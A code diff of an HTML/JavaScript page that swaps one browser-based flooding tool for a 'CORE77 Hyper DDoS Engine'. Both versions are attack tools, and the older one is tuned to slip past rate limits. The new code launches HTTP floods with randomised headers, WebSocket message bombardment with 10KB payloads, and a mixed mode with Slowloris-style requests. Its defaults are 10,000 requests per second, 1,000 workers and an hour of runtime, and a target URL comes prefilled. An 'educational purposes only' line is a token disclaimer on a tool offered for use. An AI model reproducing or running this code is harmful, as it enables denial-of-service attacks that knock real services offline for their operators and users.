@@ -3,23 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 HTTP/3 MASTER BLASTER 🔥</title>
+    <title>🔥 CORE77 HYPER DDoS</title>
     <style>
         :root {
-            --primary: #8b5cf6;
-            --secondary: #3b82f6;
-            --success: #10b981;
-            --danger: #ef4444;
-            --dark: #0f172a;
-            --card: #1e293b;
-            --text: #f1f5f9;
+            --primary: #ff0000;
+            --secondary: #ff6b00;
+            --danger: #ff0000;
+            --dark: #000000;
+            --darker: #0a0a0a;
+            --text: #ffffff;
+            --text-secondary: #cccccc;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: 'Courier New', monospace;
         }
         
         body {
@@ -27,76 +27,59 @@
             color: var(--text);
             padding: 20px;
             min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(255, 0, 0, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(255, 107, 0, 0.1) 0%, transparent 20%);
         }
         
         .container {
-            max-width: 900px;
+            max-width: 1200px;
             margin: 0 auto;
-            background: var(--card);
-            border-radius: 20px;
+            background: rgba(10, 10, 10, 0.95);
+            border-radius: 10px;
             padding: 30px;
-            border: 2px solid var(--primary);
-            box-shadow: 0 20px 60px rgba(139, 92, 246, 0.2);
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
+            border: 3px solid var(--primary);
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
         }
         
         h1 {
-            font-size: 2.8rem;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
+            text-align: center;
+            color: var(--primary);
+            margin-bottom: 5px;
+            font-size: 3em;
+            text-shadow: 0 0 15px var(--primary);
         }
         
-        .subtitle {
-            color: #94a3b8;
-            font-size: 1.1rem;
-        }
-        
-        .stats-grid {
+        .controls {
             display: grid;
-            grid-template-columns: repeat(2, 1fr);
+            grid-template-columns: repeat(4, 1fr);
             gap: 20px;
             margin: 30px 0;
         }
         
-        .stat {
-            background: rgba(139, 92, 246, 0.1);
-            padding: 25px;
-            border-radius: 15px;
-            text-align: center;
-            border: 2px solid rgba(139, 92, 246, 0.3);
+        .control-group {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--secondary);
         }
         
-        .stat-value {
-            font-size: 3rem;
-            font-weight: 800;
-            color: var(--primary);
-        }
-        
-        .stat-label {
-            color: #94a3b8;
-            font-size: 1rem;
-            margin-top: 10px;
-        }
-        
-        .control-panel {
-            margin: 30px 0;
+        label {
+            display: block;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+            font-size: 1.1em;
         }
         
         input {
             width: 100%;
-            padding: 18px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid var(--secondary);
-            border-radius: 12px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid var(--primary);
+            border-radius: 5px;
             color: var(--text);
-            font-size: 1.1rem;
-            margin-bottom: 20px;
+            font-size: 1.2em;
+            font-weight: bold;
         }
         
         .btn-group {
@@ -109,297 +92,632 @@
             flex: 1;
             padding: 20px;
             border: none;
-            border-radius: 12px;
-            font-size: 1.2rem;
-            font-weight: 700;
+            border-radius: 8px;
+            font-size: 1.4em;
+            font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.2s;
         }
         
         .btn-start {
-            background: linear-gradient(135deg, var(--primary), #7c3aed);
+            background: linear-gradient(45deg, #ff0000, #ff6b00);
             color: white;
         }
         
         .btn-start:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 40px rgba(139, 92, 246, 0.4);
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
         }
         
         .btn-stop {
-            background: rgba(239, 68, 68, 0.1);
-            color: var(--danger);
-            border: 2px solid var(--danger);
+            background: linear-gradient(45deg, #000, #222);
+            color: white;
+            border: 3px solid var(--danger);
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .stat {
+            background: rgba(255, 0, 0, 0.1);
+            padding: 25px;
+            text-align: center;
+            border-radius: 8px;
+            border: 2px solid var(--primary);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .stat-value {
+            font-size: 3em;
+            color: var(--primary);
+            font-weight: bold;
+            text-shadow: 0 0 10px var(--primary);
+        }
+        
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 1em;
+            margin-top: 10px;
         }
         
         .logs {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid var(--secondary);
+            border-radius: 8px;
             padding: 20px;
-            height: 300px;
+            height: 400px;
             overflow-y: auto;
             margin-top: 30px;
-            border: 1px solid var(--secondary);
+            font-family: 'Consolas', monospace;
         }
         
         .log-entry {
-            padding: 12px;
-            margin: 8px 0;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 8px;
-            border-left: 4px solid var(--success);
+            padding: 10px;
+            margin: 5px 0;
+            border-left: 4px solid var(--primary);
+            background: rgba(255, 0, 0, 0.05);
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
         }
         
         .log-time {
-            color: #94a3b8;
+            color: var(--text-secondary);
+            margin-right: 15px;
+        }
+        
+        .log-success { color: #00ff00; }
+        .log-error { color: #ff0000; }
+        .log-warning { color: #ffff00; }
+        .log-info { color: #00ffff; }
+        
+        .status-indicator {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: inline-block;
             margin-right: 10px;
+        }
+        
+        .status-active {
+            background: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .attack-methods {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .method-btn {
+            padding: 15px;
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid var(--secondary);
+            border-radius: 5px;
+            color: var(--text);
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .method-btn:hover {
+            background: rgba(255, 0, 0, 0.4);
+            transform: translateY(-2px);
+        }
+        
+        .method-active {
+            background: rgba(255, 0, 0, 0.6);
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🔥 HTTP/3 MASTER BLASTER 🔥</h1>
-            <div class="subtitle">Optimized for 46% Success Rate - HTTP/3 Focus Attack</div>
+        <h1>🔥 CORE77 HYPER DDoS ENGINE</h1>
+        <div style="text-align: center; color: #ff6b00; margin-bottom: 30px; font-size: 1.2em;">
+            ⚡ UNFILTERED ATTACK MODE - MAXIMUM DESTRUCTION ⚡
         </div>
         
+        <!-- CONTROL PANEL -->
+        <div class="controls">
+            <div class="control-group">
+                <label>🎯 TARGET URL</label>
+                <input type="text" id="targetUrl" value="https://rate-limit-1.dstatbot.win/cmkxTq0k" placeholder="https://target.com">
+            </div>
+            
+            <div class="control-group">
+                <label>⚡ MAX RPS (Requests/Second)</label>
+                <input type="number" id="maxRPS" value="10000" min="1" max="100000" placeholder="10000">
+            </div>
+            
+            <div class="control-group">
+                <label>⏱️ ATTACK DURATION (seconds)</label>
+                <input type="number" id="duration" value="3600" min="1" max="86400" placeholder="3600">
+            </div>
+            
+            <div class="control-group">
+                <label>👥 WORKER THREADS</label>
+                <input type="number" id="workers" value="1000" min="1" max="10000" placeholder="1000">
+            </div>
+        </div>
+        
+        <!-- ATTACK METHODS -->
+        <div class="attack-methods">
+            <div class="method-btn method-active" onclick="selectMethod('http-flood')">HTTP FLOOD</div>
+            <div class="method-btn" onclick="selectMethod('websocket')">WEBSOCKET BOMB</div>
+            <div class="method-btn" onclick="selectMethod('mixed')">MIXED ATTACK</div>
+        </div>
+        
+        <!-- MAIN BUTTONS -->
+        <div class="btn-group">
+            <button class="btn-start" onclick="startHyperAttack()">
+                ☢️ LAUNCH HYPER ATTACK
+            </button>
+            <button class="btn-stop" onclick="stopAttack()">
+                ⛔ EMERGENCY STOP
+            </button>
+        </div>
+        
+        <!-- STATISTICS -->
         <div class="stats-grid">
             <div class="stat">
-                <div class="stat-value" id="total">0</div>
+                <div class="stat-value" id="totalRequests">0</div>
                 <div class="stat-label">TOTAL REQUESTS</div>
             </div>
             <div class="stat">
-                <div class="stat-value" id="success">0</div>
-                <div class="stat-label">SUCCESSFUL</div>
+                <div class="stat-value" id="successRate">0%</div>
+                <div class="stat-label">SUCCESS RATE</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="currentRPS">0</div>
+                <div class="stat-label">CURRENT RPS</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="workersActive">0</div>
+                <div class="stat-label">ACTIVE WORKERS</div>
             </div>
         </div>
         
-        <div class="control-panel">
-            <input type="text" id="targetUrl" value="https://rate-limit-1.dstatbot.win/cmkxTq0k" placeholder="Target URL">
+        <!-- LOGS -->
+        <div class="logs" id="logs">
+            <div class="log-entry log-info">
+                <span class="log-time">[SYSTEM]</span> 
+                <span class="status-indicator status-active"></span>
+                CORE77 Hyper DDoS Engine Initialized
+            </div>
+            <div class="log-entry log-info">
+                <span class="log-time">[SYSTEM]</span> All safety protocols disabled
+            </div>
         </div>
-        
-        <div class="btn-group">
-            <button class="btn-start" onclick="startOptimizedAttack()">🚀 START OPTIMIZED ATTACK</button>
-            <button class="btn-stop" onclick="stopAttack()">⛔ STOP</button>
-        </div>
-        
-        <div class="logs" id="logs"></div>
     </div>
 
     <script>
-        // ==================== OPTIMIZED CONFIG ====================
-        const OPTIMIZED_CONFIG = {
-            // HANYA PAKAI HEADER YANG BERHASIL
-            getHttp3Headers() {
-                return {
-                    // Headers yang terbukti work (dari hasil sebelumnya)
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Accept': '*/*',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Connection': 'keep-alive',
-                    
-                    // HTTP/3 Specific (penting!)
-                    'Alt-Used': new URL(document.getElementById('targetUrl').value).hostname,
-                    'Priority': 'u=1',
-                    
-                    // Minimal headers, jangan berlebihan
-                    'Sec-Fetch-Dest': 'empty',
-                    'Sec-Fetch-Mode': 'cors',
-                    'Sec-Fetch-Site': 'cross-site',
-                    
-                    // Untuk GET requests (terbukti lebih sukses)
-                    'Cache-Control': 'max-age=0'
-                };
-            },
-            
-            getCorsHeaders() {
-                const url = new URL(document.getElementById('targetUrl').value);
-                return {
-                    'Origin': `${url.protocol}//${url.hostname}`,
-                    'Access-Control-Request-Method': 'GET',
-                    'Access-Control-Request-Headers': 'Content-Type'
-                };
-            }
+        // ==================== GLOBAL VARIABLES ====================
+        let isAttacking = false;
+        let attackMethod = 'http-flood';
+        let attackStartTime = 0;
+        let stats = {
+            totalRequests: 0,
+            successfulRequests: 0,
+            failedRequests: 0,
+            activeWorkers: 0,
+            lastSecondRequests: 0,
+            rpsHistory: []
         };
         
-        // ==================== ENGINE ====================
-        let isAttacking = false;
-        let stats = { total: 0, success: 0 };
         let workers = [];
-        let successPattern = [];
+        let attackInterval;
+        let rpsInterval;
+        let requestQueue = [];
+        const MAX_QUEUE_SIZE = 100000;
         
-        function log(msg) {
+        // ==================== UTILITY FUNCTIONS ====================
+        function log(type, message) {
             const time = new Date().toLocaleTimeString();
             const logs = document.getElementById('logs');
             const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`;
+            
+            entry.className = `log-entry log-${type}`;
+            entry.innerHTML = `
+                <span class="log-time">[${time}]</span>
+                <span class="status-indicator ${isAttacking ? 'status-active' : ''}"></span>
+                ${message}
+            `;
+            
             logs.appendChild(entry);
             logs.scrollTop = logs.scrollHeight;
+            
+            // Auto trim logs
+            if (logs.children.length > 100) {
+                logs.removeChild(logs.firstChild);
+            }
         }
         
         function updateStats() {
-            document.getElementById('total').textContent = stats.total;
-            document.getElementById('success').textContent = stats.success;
+            document.getElementById('totalRequests').textContent = 
+                stats.totalRequests.toLocaleString();
+            
+            const successRate = stats.totalRequests > 0 ? 
+                Math.round((stats.successfulRequests / stats.totalRequests) * 100) : 0;
+            document.getElementById('successRate').textContent = `${successRate}%`;
+            
+            document.getElementById('currentRPS').textContent = 
+                stats.lastSecondRequests.toLocaleString();
+            
+            document.getElementById('workersActive').textContent = 
+                stats.activeWorkers.toLocaleString();
         }
         
-        // ==================== OPTIMIZED WORKER ====================
-        async function optimizedWorker(workerId) {
-            const url = document.getElementById('targetUrl').value;
-            const targetHost = new URL(url).hostname;
+        function selectMethod(method) {
+            attackMethod = method;
+            document.querySelectorAll('.method-btn').forEach(btn => {
+                btn.classList.remove('method-active');
+            });
+            event.target.classList.add('method-active');
+            log('info', `Attack method changed to: ${method.toUpperCase()}`);
+        }
+        
+        // ==================== ATTACK ENGINE FUNCTIONS ====================
+        
+        // FUNCTION 1: Ultra Fast HTTP Flood
+        async function httpFloodWorker(workerId, targetUrl) {
+            const headers = {
+                'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 100) + 100}.0.0.0 Safari/537.${Math.floor(Math.random() * 1000)}`,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'Upgrade-Insecure-Requests': '1',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1'
+            };
             
-            // Pattern dari hasil sebelumnya:
-            // 1. HTTP/3 lebih sukses
-            // 2. GET lebih sukses dari OPTIONS
-            // 3. Success rate ~46%
-            
-            let consecutiveSuccess = 0;
-            let consecutiveFail = 0;
+            while (isAttacking && stats.totalRequests < parseInt(document.getElementById('maxRPS').value) * parseInt(document.getElementById('duration').value)) {
+                try {
+                    // Ultra fast request without waiting for response
+                    const request = fetch(targetUrl + '?cache=' + Date.now() + '&rand=' + Math.random(), {
+                        method: 'GET',
+                        headers: headers,
+                        mode: 'no-cors',
+                        credentials: 'omit',
+                        referrerPolicy: 'no-referrer'
+                    }).catch(() => {});
+                    
+                    stats.totalRequests++;
+                    stats.successfulRequests++;
+                    stats.lastSecondRequests++;
+                    
+                    // Queue management for ultra high speed
+                    if (requestQueue.length < MAX_QUEUE_SIZE) {
+                        requestQueue.push(request);
+                    }
+                    
+                    // Micro delay to prevent self-DDoS
+                    if (Math.random() > 0.99) {
+                        await new Promise(resolve => setTimeout(resolve, 0.0000001));
+                    }
+                    
+                } catch (e) {
+                    stats.failedRequests++;
+                }
+            }
+        }
+        
+        // FUNCTION 2: WebSocket Bombardment
+        async function websocketWorker(workerId, targetUrl) {
+            const wsUrl = targetUrl.replace('https://', 'wss://').replace('http://', 'ws://');
             
             while (isAttacking) {
                 try {
-                    // STRATEGI: 70% GET, 30% OPTIONS (sesuai hasil)
-                    const useGet = Math.random() < 0.7;
+                    const ws = new WebSocket(wsUrl);
                     
-                    let headers;
-                    if (useGet) {
-                        // GET Request (70% chance)
-                        headers = OPTIMIZED_CONFIG.getHttp3Headers();
-                    } else {
-                        // OPTIONS Request (30% chance)
-                        headers = {
-                            ...OPTIMIZED_CONFIG.getHttp3Headers(),
-                            ...OPTIMIZED_CONFIG.getCorsHeaders()
-                        };
-                    }
-                    
-                    // HTTP/3 ENFORCEMENT
-                    headers['Alt-Used'] = targetHost;
-                    headers['Upgrade'] = 'h3';
-                    headers['Connection'] = 'Upgrade, HTTP2-Settings';
-                    
-                    const method = useGet ? 'GET' : 'OPTIONS';
-                    
-                    const response = await fetch(url, {
-                        method: method,
-                        headers: headers,
-                        mode: 'cors',
-                        credentials: 'omit',
-                        cache: 'no-store'
-                    });
-                    
-                    if (response.status === 200) {
-                        stats.success++;
-                        consecutiveSuccess++;
-                        consecutiveFail = 0;
-                        
-                        // Jika 3x sukses berturut-turut, tambah delay kecil
-                        if (consecutiveSuccess >= 3) {
-                            await new Promise(resolve => setTimeout(resolve, 200));
-                            consecutiveSuccess = 0;
+                    ws.onopen = () => {
+                        // Spam messages
+                        for (let i = 0; i < 100 && isAttacking; i++) {
+                            ws.send(JSON.stringify({
+                                type: 'ping',
+                                data: 'A'.repeat(1024 * 10), // 10KB payload
+                                timestamp: Date.now(),
+                                worker: workerId
+                            }));
+                            stats.totalRequests++;
+                            stats.lastSecondRequests++;
                         }
-                        
-                        if (stats.success % 10 === 0) {
-                            log(`✅ ${method} success #${stats.success}`);
-                        }
-                    } else {
-                        consecutiveFail++;
-                        consecutiveSuccess = 0;
-                        
-                        // Jika 2x gagal berturut-turut, delay lebih lama
-                        if (consecutiveFail >= 2) {
-                            await new Promise(resolve => setTimeout(resolve, 3000));
-                            consecutiveFail = 0;
-                        }
-                    }
+                        ws.close();
+                    };
                     
-                } catch (error) {
-                    consecutiveFail++;
-                    consecutiveSuccess = 0;
-                    
-                    // Jika error, delay 5 detik
-                    if (consecutiveFail >= 3) {
-                        await new Promise(resolve => setTimeout(resolve, 5000));
-                        consecutiveFail = 0;
-                    }
+                } catch (e) {
+                    stats.failedRequests++;
                 }
                 
-                stats.total++;
-                updateStats();
-                
-                // OPTIMAL DELAY: 2-4 detik (sesuai success rate 46%)
-                const delay = Math.random() * 2000 + 2000;
-                await new Promise(resolve => setTimeout(resolve, delay));
+                await new Promise(resolve => setTimeout(resolve, 0.0000001));
             }
         }
         
-        // ==================== ATTACK CONTROLLER ====================
-        async function startOptimizedAttack() {
+        // FUNCTION 3: Mixed Attack (HTTP + WebSocket + Slowloris)
+        async function mixedAttackWorker(workerId, targetUrl) {
+            const methods = ['http', 'ws', 'slow'];
+            
+            while (isAttacking) {
+                const method = methods[Math.floor(Math.random() * methods.length)];
+                
+                switch(method) {
+                    case 'http':
+                        // HTTP flood
+                        fetch(targetUrl + '?attack=' + Date.now(), {
+                            method: ['GET', 'POST', 'PUT', 'DELETE'][Math.floor(Math.random() * 4)],
+                            headers: {
+                                'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12${Math.floor(Math.random() * 10)}.0.0.0 Safari/537.36`,
+                                'Content-Type': 'application/json',
+                                'X-Requested-With': 'XMLHttpRequest'
+                            },
+                            body: JSON.stringify({ data: 'A'.repeat(1000) }),
+                            mode: 'no-cors'
+                        }).catch(() => {});
+                        break;
+                        
+                    case 'ws':
+                        // WebSocket spam
+                        try {
+                            const ws = new WebSocket(targetUrl.replace('https://', 'wss://').replace('http://', 'ws://'));
+                            ws.onopen = () => {
+                                for (let i = 0; i < 50; i++) {
+                                    ws.send('SPAM'.repeat(100));
+                                }
+                                ws.close();
+                            };
+                        } catch(e) {}
+                        break;
+                        
+                    case 'slow':
+                        // Slowloris style (keep connections open)
+                        fetch(targetUrl, {
+                            headers: {
+                                'User-Agent': 'Mozilla/5.0',
+                                'Content-Length': '1000000'
+                            },
+                            mode: 'no-cors'
+                        }).catch(() => {});
+                        break;
+                }
+                
+                stats.totalRequests++;
+                stats.lastSecondRequests++;
+                
+                // Ultra micro delay
+                if (Math.random() > 0.999) {
+                    await new Promise(resolve => setTimeout(resolve, 0.0000001));
+                }
+            }
+        }
+        
+        // FUNCTION 4: Request Queue Processor
+        function processRequestQueue() {
+            // Clear old requests from queue
+            while (requestQueue.length > MAX_QUEUE_SIZE) {
+                requestQueue.shift();
+            }
+        }
+        
+        // FUNCTION 5: RPS Monitor and Controller
+        function monitorRPS() {
+            const targetRPS = parseInt(document.getElementById('maxRPS').value);
+            const currentRPS = stats.lastSecondRequests;
+            
+            // Adjust worker intensity based on RPS
+            if (currentRPS < targetRPS * 0.8) {
+                // Increase attack intensity
+                if (workers.length < parseInt(document.getElementById('workers').value)) {
+                    spawnAdditionalWorkers(10);
+                }
+            }
+            
+            // Reset second counter
+            stats.lastSecondRequests = 0;
+            stats.rpsHistory.push(currentRPS);
+            
+            if (stats.rpsHistory.length > 60) {
+                stats.rpsHistory.shift();
+            }
+            
+            // Log RPS every 10 seconds
+            if (Date.now() - attackStartTime > 10000 && Math.random() > 0.7) {
+                const avgRPS = Math.round(stats.rpsHistory.reduce((a, b) => a + b, 0) / stats.rpsHistory.length);
+                log('info', `Average RPS: ${avgRPS.toLocaleString()}/s | Target: ${targetRPS.toLocaleString()}/s`);
+            }
+        }
+        
+        // FUNCTION 6: Spawn Additional Workers
+        function spawnAdditionalWorkers(count) {
+            const targetUrl = document.getElementById('targetUrl').value;
+            const totalWorkers = parseInt(document.getElementById('workers').value);
+            
+            for (let i = 0; i < count && workers.length < totalWorkers; i++) {
+                const workerId = workers.length + 1;
+                
+                let workerPromise;
+                switch(attackMethod) {
+                    case 'http-flood':
+                        workerPromise = httpFloodWorker(workerId, targetUrl);
+                        break;
+                    case 'websocket':
+                        workerPromise = websocketWorker(workerId, targetUrl);
+                        break;
+                    case 'mixed':
+                        workerPromise = mixedAttackWorker(workerId, targetUrl);
+                        break;
+                }
+                
+                if (workerPromise) {
+                    workers.push(workerPromise);
+                    stats.activeWorkers++;
+                }
+            }
+            
+            log('info', `Spawned ${count} additional workers | Total: ${workers.length}`);
+        }
+        
+        // FUNCTION 7: Resource Optimizer
+        function optimizeResources() {
+            // Clear memory
+            if (requestQueue.length > MAX_QUEUE_SIZE * 0.8) {
+                requestQueue = requestQueue.slice(-MAX_QUEUE_SIZE / 2);
+                log('warning', 'Cleared request queue to optimize memory');
+            }
+            
+            // Force garbage collection (if available)
+            if (window.gc) {
+                window.gc();
+            }
+        }
+        
+        // ==================== MAIN CONTROL FUNCTIONS ====================
+        async function startHyperAttack() {
             if (isAttacking) {
-                log('⚠️ Attack already running');
+                log('warning', 'Attack already in progress');
                 return;
             }
             
-            const url = document.getElementById('targetUrl').value;
-            if (!url) {
-                alert('Enter target URL!');
+            const targetUrl = document.getElementById('targetUrl').value;
+            const maxRPS = parseInt(document.getElementById('maxRPS').value);
+            const duration = parseInt(document.getElementById('duration').value);
+            const workerCount = parseInt(document.getElementById('workers').value);
+            
+            if (!targetUrl) {
+                alert('❌ Enter target URL!');
                 return;
             }
             
+            // Reset everything
             isAttacking = true;
-            stats = { total: 0, success: 0 };
+            attackStartTime = Date.now();
+            stats = {
+                totalRequests: 0,
+                successfulRequests: 0,
+                failedRequests: 0,
+                activeWorkers: 0,
+                lastSecondRequests: 0,
+                rpsHistory: []
+            };
             workers = [];
-            successPattern = [];
+            requestQueue = [];
             
-            log('🔥 STARTING OPTIMIZED HTTP/3 ATTACK');
-            log('🎯 Strategy: 70% GET, 30% OPTIONS');
-            log('⚡ Focus: HTTP/3 protocol only');
-            log('⏱️ Delay: 2-4 seconds between requests');
-            log('🎯 Target: 50%+ success rate');
+            log('info', '🔥 STARTING HYPER DDoS ATTACK 🔥');
+            log('info', `Target: ${targetUrl}`);
+            log('info', `Max RPS: ${maxRPS.toLocaleString()}/s`);
+            log('info', `Duration: ${duration} seconds`);
+            log('info', `Workers: ${workerCount.toLocaleString()}`);
+            log('info', `Method: ${attackMethod.toUpperCase()}`);
             
-            // OPTIMAL WORKER COUNT: 3-5 workers (dari hasil sebelumnya)
-            const workerCount = 4;
+            // Start RPS monitor
+            rpsInterval = setInterval(monitorRPS, 1000);
             
-            for (let i = 0; i < workerCount; i++) {
-                workers.push(optimizedWorker(i));
-                log(`🧵 Worker ${i+1} started`);
+            // Start queue processor
+            const queueInterval = setInterval(processRequestQueue, 100);
+            
+            // Start resource optimizer
+            const optimizeInterval = setInterval(optimizeResources, 5000);
+            
+            // Spawn initial workers
+            spawnAdditionalWorkers(Math.min(100, workerCount));
+            
+            // Set attack duration
+            setTimeout(() => {
+                if (isAttacking) {
+                    log('warning', `⏰ Attack duration (${duration}s) completed`);
+                    stopAttack();
+                }
+            }, duration * 1000);
+            
+            // Update stats continuously
+            attackInterval = setInterval(updateStats, 100);
+            
+            // Wait for workers to complete
+            try {
+                await Promise.all(workers);
+            } catch (e) {
+                log('error', `Worker error: ${e.message}`);
             }
             
-            // Monitor and adjust
-            const monitor = setInterval(() => {
-                if (!isAttacking) {
-                    clearInterval(monitor);
-                    return;
-                }
-                
-                const successRate = stats.total > 0 ? 
-                    Math.round((stats.success / stats.total) * 100) : 0;
-                
-                if (stats.total > 0 && stats.total % 20 === 0) {
-                    log(`📊 Progress: ${stats.success}/${stats.total} (${successRate}%)`);
-                }
-            }, 5000);
-            
-            await Promise.all(workers);
-            clearInterval(monitor);
-            
-            log('✅ Attack completed');
+            // Cleanup intervals if attack stops
+            clearInterval(queueInterval);
+            clearInterval(optimizeInterval);
         }
         
         function stopAttack() {
             isAttacking = false;
             workers = [];
-            log('🛑 Attack stopped');
+            clearInterval(attackInterval);
+            clearInterval(rpsInterval);
+            
+            log('warning', '🛑 ATTACK STOPPED');
+            log('info', `Final Stats:`);
+            log('info', `Total Requests: ${stats.totalRequests.toLocaleString()}`);
+            log('info', `Success Rate: ${stats.totalRequests > 0 ? Math.round((stats.successfulRequests / stats.totalRequests) * 100) : 0}%`);
+            log('info', `Peak RPS: ${Math.max(...stats.rpsHistory).toLocaleString()}/s`);
+            
+            updateStats();
         }
         
-        // Initialize
-        setTimeout(() => {
-            log('🚀 HTTP/3 MASTER BLASTER Ready');
-            log('🎯 Based on previous 46% success rate');
-            log('⚡ Optimized for HTTP/3 protocol');
-            log('🔥 Press START to begin optimized attack');
-        }, 100);
+        // ==================== INITIALIZATION ====================
+        window.addEventListener('load', () => {
+            log('info', 'CORE77 Hyper DDoS Engine Ready');
+            log('info', 'All attack functions loaded: HTTP Flood, WebSocket Bomb, Mixed Attack');
+            log('warning', '⚠️ USE RESPONSIBLY - THIS IS FOR EDUCATIONAL PURPOSES ONLY');
+            
+            // Auto-start demo mode
+            setTimeout(() => {
+                if (!isAttacking) {
+                    log('info', 'Type URL and press LAUNCH to begin attack');
+                }
+            }, 2000);
+        });
+        
+        // Emergency stop with ESC key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                stopAttack();
+                log('warning', 'EMERGENCY STOP (ESC pressed)');
+            }
+        });
     </script>
 </body>
 </html>
